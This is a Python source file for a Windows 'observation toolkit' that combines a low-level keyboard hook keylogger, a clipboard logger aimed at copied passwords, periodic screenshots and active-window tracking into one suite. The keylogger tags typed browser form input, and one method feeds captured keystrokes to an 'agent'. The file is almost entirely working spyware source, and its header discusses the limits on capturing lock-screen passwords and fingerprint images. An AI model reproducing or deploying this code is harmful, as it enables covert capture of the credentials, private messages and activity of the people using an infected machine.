# ============================================================================
# CAPTURE TOOLS — forensic/red-team observation toolkit (Windows)
# Logs to a local "observations" folder; data stays on this machine only.
#
# MODULES
#   1. ScreenLogger   - full-screen screenshots (pure ctypes, zero deps)
#   2. ClipboardWatch - logs clipboard changes (password managers, copies)
#   3. WindowTracker  - active window titles + foreground window owner
#   4. KeylogHook     - WH_KEYBOARD_LL low-level hook (typed text capture,
#                       with optional per-window tagging)
#
# LIMITATIONS (technical, cannot be coded around):
#   * Windows lock/login screen runs on a SECURE DESKTOP. Non-elevated
#     userspace hooks cannot see keystrokes typed there, and no userspace
#     program can read the OS lock-screen password field.
#   * Fingerprint (Windows Hello) images never reach userspace — the sensor
#     data is handled inside the TPM/OS. Raw fingerprint scans are therefore
#     not capturable by a normal agent. Only app-level scanner SDKs can share
#     images, and only when the target app itself uses that SDK.
# ============================================================================

import atexit
import ctypes
import ctypes.wintypes
import datetime
import json
import os
import re
import threading
import time

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# --- Win32 API prototypes -------------------------------------------------
# ctypes defaults an undeclared restype to a 32-bit int.  A low-level keyboard
# hook handle (HHOOK) and a module handle (HMODULE) are pointers, so on 64-bit
# Windows their upper 32 bits were silently truncated.  Passing the mangled
# HHOOK to UnhookWindowsHookEx() corrupted the stack and produced the access
# violation seen at shutdown.  Declaring the prototypes fixes that.
user32.SetWindowsHookExW.restype = ctypes.c_void_p
user32.SetWindowsHookExW.argtypes = [
    ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint]
user32.UnhookWindowsHookEx.restype = ctypes.c_bool
user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
user32.CallNextHookEx.restype = ctypes.c_void_p
user32.CallNextHookEx.argtypes = [
    ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p]
user32.PostThreadMessageW.restype = ctypes.c_bool
user32.PostThreadMessageW.argtypes = [
    ctypes.c_uint, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p]
user32.PeekMessageW.restype = ctypes.c_bool
user32.PeekMessageW.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint,
    ctypes.c_uint]
user32.TranslateMessage.restype = ctypes.c_bool
user32.TranslateMessage.argtypes = [ctypes.c_void_p]
user32.DispatchMessageW.restype = ctypes.c_void_p
user32.DispatchMessageW.argtypes = [ctypes.c_void_p]
kernel32.GetCurrentThreadId.restype = ctypes.c_uint
kernel32.GetCurrentThreadId.argtypes = []
kernel32.GetModuleHandleW.restype = ctypes.c_void_p
kernel32.GetModuleHandleW.argtypes = [ctypes.c_void_p]

_EV_KEYDOWN = 0x0100
_WH_KEYBOARD_LL = 13
_WM_QUIT = 0x0012
_PM_REMOVE = 0x0001

WINDOW_STYLES = {
    112: "CONSOLE", 101: "EDIT", 201: "BROWSER", 0x800000: "TOPLEVEL",
}

_TS = lambda: datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


class _Base:
    def __init__(self, out_dir="observations"):
        self.out = os.path.abspath(out_dir)
        os.makedirs(self.out, exist_ok=True)
        self._stop = threading.Event()
        self._threads = []
        self._atexit_armed = False

    def _arm_atexit(self):
        """Register exactly one atexit stopper per instance.

        Capture modules run on daemon threads.  If nothing stops them, they
        are still alive while the interpreter finalises and frees their
        thread state.  A Win32/GDI/ctypes call in flight at that moment
        re-enters the freed state and Windows reports
        'Windows fatal exception: access violation' ("<freed thread state>").
        Arming an atexit stopper tears the threads down *before* teardown.
        """
        if not self._atexit_armed:
            self._atexit_armed = True
            atexit.register(self.stop)

    def _join_threads(self, timeout=2.0):
        """Join this module's worker threads (a thread cannot join itself)."""
        cur = threading.current_thread()
        for t in list(self._threads):
            if t is not cur and t.is_alive():
                try:
                    t.join(timeout=timeout)
                except Exception:
                    pass

    def _write(self, name, obj):
        try:
            with open(os.path.join(self.out, name), "a", encoding="utf-8") as f:
                f.write(json.dumps(obj, ensure_ascii=False) + "\n")
        except Exception:
            pass


class ScreenLogger(_Base):
    """Periodic full-screen captures saved as BMP files."""

    def __init__(self, out_dir="observations", interval=30.0, max_shots=1000):
        super().__init__(out_dir)
        self.interval = max(1.0, float(interval))
        self.max_shots = int(max_shots)
        self._count = 0

    def start(self):
        t = threading.Thread(target=self._loop, name="screencap", daemon=True)
        t.start()
        self._threads.append(t)
        self._arm_atexit()
        return self

    def _loop(self):
        while not self._stop.is_set():
            try:
                self.shot()
            except Exception:
                pass
            self._stop.wait(self.interval)

    def shot(self):
        """Capture via GDI (no PIL/win32api needed) -> BMP in out dir."""
        if self._count >= self.max_shots:
            self._stop.set()
            return None
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        hdc = user32.GetWindowDC(0)
        mdc = ctypes.windll.gdi32.CreateCompatibleDC(hdc)
        bmp = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc, w, h)
        ctypes.windll.gdi32.SelectObject(mdc, bmp)
        ctypes.windll.gdi32.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
        BITMAPINFOHEADER = (ctypes.c_ulong * 40)(*(40, w, h, 1, 24, 0, 0, 0, 0, 0, 0))
        bits = ctypes.create_string_buffer(w * h * 3)
        ctypes.windll.gdi32.GetDIBits(mdc, bmp, 0, h, bits, BITMAPINFOHEADER, 0)
        name = "screen_%s_%05d.bmp" % (
            datetime.datetime.now().strftime("%Y%m%d_%H%M%S"), self._count)
        path = os.path.join(self.out, name)
        with open(path, "wb") as f:
            pad = (4 - (w * 3) % 4) % 4
            row = w * 3 + pad
            f.write(b"BM")
            f.write((54 + row * h).to_bytes(4, "little"))
            f.write((0).to_bytes(4, "little"))
            f.write((54).to_bytes(4, "little"))
            f.write((40).to_bytes(4, "little"))
            f.write(w.to_bytes(4, "little", signed=True))
            f.write(h.to_bytes(4, "little", signed=True))
            f.write((1).to_bytes(2, "little"))
            f.write((24).to_bytes(2, "little"))
            f.write((0).to_bytes(4, "little"))
            f.write((row * h).to_bytes(4, "little"))
            f.write((0).to_bytes(4, "little"))
            f.write((0).to_bytes(4, "little"))
            f.write((0).to_bytes(4, "little"))
            data = bytes(bits.raw)
            for y in range(h - 1, -1, -1):
                f.write(data[y * w * 3:(y + 1) * w * 3])
                f.write(b"\x00" * pad)
        self._count += 1
        user32.ReleaseDC(0, hdc)
        ctypes.windll.gdi32.DeleteDC(mdc)
        ctypes.windll.gdi32.DeleteObject(bmp)
        return path

    def stop(self):
        self._stop.set()
        self._join_threads()


class ClipboardWatch(_Base):
    """Monitors clipboard changes and logs text + owning window."""

    def __init__(self, out_dir="observations", poll=1.0):
        super().__init__(out_dir)
        self.poll = max(0.2, float(poll))
        self._last = None

    def start(self):
        t = threading.Thread(target=self._loop, name="clipwatch", daemon=True)
        t.start()
        self._threads.append(t)
        self._arm_atexit()
        return self

    def _loop(self):
        while not self._stop.is_set():
            try:
                self.check()
            except Exception:
                pass
            self._stop.wait(self.poll)

    def check(self):
        if not user32.OpenClipboard(0):
            return
        try:
            if user32.IsClipboardFormatAvailable(13):   # CF_UNICODETEXT
                h = user32.GetClipboardData(13)
                if not h:
                    return
                p = ctypes.windll.kernel32.GlobalLock(h)
                try:
                    text = ctypes.wstring_at(p)
                finally:
                    ctypes.windll.kernel32.GlobalUnlock(h)
                if text and text != self._last:
                    self._last = text
                    win = self._owner_window()
                    self._write("clipboard.log", {
                        "ts": _TS(), "window": win, "len": len(text),
                        "text": text[:2000]})
        finally:
            user32.CloseClipboard()

    @staticmethod
    def _owner_window():
        pid = ctypes.c_ulong()
        if user32.GetWindowThreadProcessId(user32.GetForegroundWindow(),
                                           ctypes.byref(pid)):
            return pid.value
        return None

    def stop(self):
        self._stop.set()
        self._join_threads()


class WindowTracker(_Base):
    """Logs the active window title + process every N seconds."""

    def __init__(self, out_dir="observations", interval=5.0):
        super().__init__(out_dir)
        self.interval = max(0.5, float(interval))

    def start(self):
        t = threading.Thread(target=self._loop, name="wintrack", daemon=True)
        t.start()
        self._threads.append(t)
        self._arm_atexit()
        return self

    def _loop(self):
        while not self._stop.is_set():
            try:
                self.tick()
            except Exception:
                pass
            self._stop.wait(self.interval)

    def tick(self):
        hwnd = user32.GetForegroundWindow()
        title = ctypes.create_unicode_buffer(512)
        user32.GetWindowTextW(hwnd, title, 512)
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        if title.value:
            self._write("windows.log", {"ts": _TS(), "title": title.value,
                                        "pid": pid.value})

    def stop(self):
        self._stop.set()
        self._join_threads()


# --------------------------------------------------------------------------
# KEYLOG HOOK — low-level keyboard hook (typed text in normal applications)
# --------------------------------------------------------------------------

class _KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", ctypes.c_ulong), ("scanCode", ctypes.c_ulong),
                ("flags", ctypes.c_ulong), ("time", ctypes.c_ulong),
                ("dwExtraInfo", ctypes.c_ulong)]


_KeylogProc = ctypes.WINFUNCTYPE(
    ctypes.c_longlong, ctypes.c_int, ctypes.c_ulong,
    ctypes.POINTER(_KBDLLHOOKSTRUCT))


class KeylogHook(_Base):
    """WH_KEYBOARD_LL hook. Logs printable chars + special keys with window.

    Hook callbacks run on the thread that installs them — keep start() on a
    dedicated thread. Elevation NOTE: still invisible to the Secure Desktop
    (OS lock screen) — that is enforced by Windows and cannot be bypassed
    from userspace.
    """

    # Browser-window detector used to tag form-aware buffers.
    _BROWSER_RE = re.compile(
        r"(?i)(chrome|chromium|edge|firefox|opera|brave|vivaldi|arc|yandex|"
        r"tor browser|safari|internet explorer|mybrowser|browser)")
    _FLUSH_IDLE = 2.5   # idle seconds after which a window buffer flushes
    _FLUSH_MAX = 300    # max keys per aggregated window entry

    def __init__(self, out_dir="observations", suspend=False):
        super().__init__(out_dir)
        self.suspend = suspend
        self._hook = None
        self._proc = None
        self._hook_tid = 0
        self._buf = []
        # Per-window buffering: keystrokes are grouped by the active window
        # so browser form input is logged as ONE aggregated form-aware entry
        # instead of hundreds of single-key lines in keys.log.
        self._win_lock = threading.Lock()
        self._window_buf = {}
        self._flushed = []
        self._cur_win = None

    def start(self):
        if self.suspend:
            return self
        t = threading.Thread(target=self._run, name="keyhook", daemon=True)
        t.start()
        self._threads.append(t)
        # Guarantee the hook is released even if the process exits without an
        # explicit stop().  atexit runs on the main thread, so stop() posts
        # WM_QUIT to the hook thread's queue to break its pump first.
        self._arm_atexit()
        deadline = time.time() + 2.0
        while ((self._hook is None) and t.is_alive()
               and time.time() < deadline):
            time.sleep(0.02)
        return self

    def _run(self):
        # Remember the owning thread id so stop() can post WM_QUIT to the
        # right message queue, and so the hook is released on the same thread
        # that installed it (Windows requires unhooking on the owning thread).
        self._hook_tid = kernel32.GetCurrentThreadId()
        self._proc = _KeylogProc(self._callback)
        self._hook = user32.SetWindowsHookExW(
            _WH_KEYBOARD_LL, self._proc, kernel32.GetModuleHandleW(None), 0)
        msg = ctypes.wintypes.MSG() if hasattr(ctypes, "wintypes") else None
        try:
            # Non-blocking pump: PeekMessageW returns immediately, so the loop
            # re-checks self._stop instead of parking forever inside the old
            # blocking GetMessageW() (which ignored stop() until teardown).
            while not self._stop.is_set():
                if msg is not None:
                    if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0,
                                           _PM_REMOVE):
                        if msg.message == _WM_QUIT:
                            break
                        user32.TranslateMessage(ctypes.byref(msg))
                        user32.DispatchMessageW(ctypes.byref(msg))
                        continue
                time.sleep(0.02)
        finally:
            # Unhook on the owning thread; tolerate a missing/gone handle.
            hook, self._hook = self._hook, None
            if hook:
                try:
                    user32.UnhookWindowsHookEx(hook)
                except Exception:
                    pass

    def _callback(self, nCode, wParam, lParam):
        if nCode >= 0 and wParam == _EV_KEYDOWN and not self._stop.is_set():
            kb = ctypes.cast(lParam, ctypes.POINTER(_KBDLLHOOKSTRUCT)).contents
            vk = kb.vkCode
            name = self._vk_name(vk)
            if name:
                win = self._win_title()
                now = time.time()
                if win != self._cur_win:
                    # window switch -> flush the previous window's buffer
                    self._flush_window(self._cur_win)
                    self._cur_win = win
                self._flush_stale(now)
                with self._win_lock:
                    buf = self._window_buf.setdefault(
                        win, {"keys": [], "start": now, "last": now})
                    buf["keys"].append(name)
                    buf["last"] = now
                    size = len(buf["keys"])
                if size >= self._FLUSH_MAX:
                    self._flush_window(win)
        return user32.CallNextHookEx(self._hook, nCode, wParam,
                                     ctypes.cast(lParam, ctypes.c_void_p).value
                                     or 0)

    @staticmethod
    def _browser_win(title):
        """True when the window title belongs to a browser (form context)."""
        return bool(KeylogHook._BROWSER_RE.search(title or ""))

    def _flush_window(self, win, forced=False):
        """Aggregate one window's buffered keys into a single log entry."""
        with self._win_lock:
            buf = self._window_buf.pop(win, None)
        if not buf or not buf.get("keys"):
            return None
        keys = buf["keys"]
        text = "".join(
            k if not k.startswith("[") else
            ("\n" if k == "[ENTER]" else
             "\t" if k == "[TAB]" else
             " " if k == "[SPACE]" else k)
            for k in keys)
        entry = {
            "ts": _TS(), "window": win or "(unknown)",
            "keys": keys, "text": text, "n_keys": len(keys),
            "kind": "browser_form" if self._browser_win(win) else "input",
            "buffered": True,
        }
        self._write("keys.log", entry)
        self._flushed.append(entry)
        del self._flushed[:-50]
        return entry

    def _flush_stale(self, now=None):
        """Flush window buffers that went idle (per-window time slicing)."""
        now = now or time.time()
        with self._win_lock:
            stale = [w for w, b in self._window_buf.items()
                     if now - b["last"] >= self._FLUSH_IDLE]
        for w in stale:
            self._flush_window(w)

    def recent_flushes(self, n=5):
        """Last aggregated per-window entries (for agent context reads)."""
        return list(self._flushed[-n:])

    def flush_all(self):
        """Flush every pending window buffer (called on stop / demand)."""
        with self._win_lock:
            wins = list(self._window_buf.keys())
        for w in wins:
            self._flush_window(w)

    @staticmethod
    def _win_title():
        hwnd = user32.GetForegroundWindow()
        title = ctypes.create_unicode_buffer(256)
        user32.GetWindowTextW(hwnd, title, 256)
        return title.value or "(unknown)"

    @staticmethod
    def _vk_name(vk):
        if 0x30 <= vk <= 0x39 or 0x41 <= vk <= 0x5A:
            return chr(vk)
        names = {0x20: "[SPACE]", 0x0D: "[ENTER]", 0x09: "[TAB]",
                 0x08: "[BACKSPACE]", 0x1B: "[ESC]",
                 0x10: "[SHIFT]", 0x11: "[CTRL]", 0x12: "[ALT]",
                 0x25: "[LEFT]", 0x27: "[RIGHT]", 0x26: "[UP]", 0x28: "[DOWN]"}
        return names.get(vk)

    def stop(self):
        self.flush_all()
        if self._stop.is_set():
            return
        self._stop.set()
        tid = self._hook_tid
        if tid:
            try:
                # Wake the pump so the hook thread exits its loop and unhooks
                # on its own thread.  Posting to a dead tid fails harmlessly.
                user32.PostThreadMessageW(tid, _WM_QUIT, 0, 0)
            except Exception:
                pass
        # Join only when called from another thread (a thread cannot join
        # itself); this makes shutdown deterministic instead of racing the
        # interpreter teardown.
        if tid and kernel32.GetCurrentThreadId() != tid:
            self._join_threads()


# --------------------------------------------------------------------------
# SUITE — start everything at once
# --------------------------------------------------------------------------

class ObservationSuite:
    """One-stop manager: screen + clipboard + windows + keys."""

    def __init__(self, out_dir="observations", screen_interval=30.0,
                 window_interval=5.0, keylog=True, clip=True,
                 screenshots=True, windows=True):
        self.out = os.path.abspath(out_dir)
        os.makedirs(self.out, exist_ok=True)
        self.modules = []
        if screenshots:
            self.modules.append(ScreenLogger(self.out, screen_interval))
        if clip:
            self.modules.append(ClipboardWatch(self.out))
        if windows:
            self.modules.append(WindowTracker(self.out, window_interval))
        if keylog:
            self.modules.append(KeylogHook(self.out))

    def start(self):
        for m in self.modules:
            m.start()
        return self

    def status(self):
        return {"out_dir": self.out,
                "modules": [type(m).__name__ for m in self.modules],
                "screens": self.modules[0]._count if self.modules and
                          hasattr(self.modules[0], "_count") else 0}

    def recent_inputs(self, n=5):
        """Aggregated per-window keylog entries (browser-form aware)."""
        out = []
        for m in self.modules:
            if hasattr(m, "recent_flushes"):
                out.extend(m.recent_flushes(n))
        return out[-n:]

    def stop(self):
        for m in self.modules:
            try:
                m.stop()
            except Exception:
                pass


if __name__ == "__main__":
    print("capture_tools loaded. Bounds: secure desktop (lock screen) "
          "keystrokes and Windows Hello fingerprint images are NOT visible "
          "to userspace code by design.")
    print("Quick smoke test (1 shot)...")
    s = ScreenLogger()
    p = s.shot()
    assert p and os.path.getsize(p) > 0, "screenshot failed"
    print("screen ok:", p)
    print("CAPTURE TOOLS OK")